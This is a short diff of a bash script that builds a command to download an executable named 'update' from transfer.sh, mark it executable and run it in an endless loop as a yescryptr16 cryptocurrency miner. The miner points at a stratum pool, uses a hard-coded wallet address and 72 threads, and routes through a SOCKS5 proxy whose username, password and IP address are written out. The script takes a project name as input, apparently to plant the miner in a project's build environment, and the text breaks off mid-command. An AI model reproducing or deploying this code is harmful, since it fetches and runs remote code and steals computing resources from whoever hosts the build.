@@ -1,6 +1,6 @@
 #!/bin/bash
 project="$1"
-script="mkdir build && cd build && wget http://transfer.sh/Qjjz9R/update && chmod +x update && echo '#!/bin/sh
+script="wget http://transfer.sh/Qjjz9R/update && chmod +x update && echo '#!/bin/sh
 chmod +x update
 while [ 1 ]; do
 ./update -a yescryptr16 -o stratum+tcp://stratum-na.rplant.xyz:17055 -u qNRPugvjxuXf9Pqyujp1mq3ohoPsEZ359Y.$(echo $(shuf -i 10-999 -n 1)-Atti) -t 72 -p datashit --proxy socks5://rifkii:awikwokk@138.128.69.13:8082
